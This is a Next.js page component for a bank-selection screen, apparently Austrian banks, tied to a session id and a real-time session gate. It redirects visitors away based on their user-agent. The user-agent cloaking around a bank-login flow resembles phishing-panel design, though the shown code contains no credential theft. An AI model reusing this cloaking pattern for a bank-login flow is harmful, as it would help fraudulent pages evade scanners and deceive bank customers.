import { headers } from "next/headers";
import { redirect } from "next/navigation";
import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { getBankCatalog } from "@/lib/at-bank-catalog";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { getBlockedRedirectUrl } from "@/lib/geo-guard";
import { resumeOrRedirectHome } from "@/lib/session-resume";
import { BankenClientClean } from "./banken-client-clean";

export const dynamic = "force-dynamic";

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function BankenPage({ searchParams }: Props) {
  const params = await searchParams;
  const h = await headers();
  const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
  if (blockedUrl) redirect(blockedUrl);
  await resumeOrRedirectHome(params);

  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: params,
  });
  const banks = await getBankCatalog();

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <BankenClientClean sessionId={sessionId} routeSessionId={routeSessionId} initialBanks={banks} />
    </>
  );
}
